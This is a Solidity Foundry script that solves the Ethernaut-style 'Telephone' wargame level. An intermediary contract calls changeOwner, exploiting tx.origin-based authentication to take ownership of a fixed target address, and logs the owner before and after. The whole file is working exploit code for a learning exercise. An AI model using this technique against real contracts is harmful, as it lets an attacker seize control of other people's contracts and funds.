// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Telephone} from "../src/L4Telephone.sol";

contract Attacker {
    Telephone telephone;

    constructor(Telephone _telephone) {
        telephone = _telephone;
        changeOwner();
    }

    function changeOwner() public {
        telephone.changeOwner(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266);
    }
}

contract L4TelephoneAttack is Script {
    Telephone telephone = Telephone(0x94099942864EA81cCF197E9D71ac53310b1468D8);

    function run() public {
        vm.startBroadcast();
        console.log("Before owner:", telephone.owner());
        new Attacker(telephone);
        console.log("After owner:", telephone.owner());
        vm.stopBroadcast();
    }
}
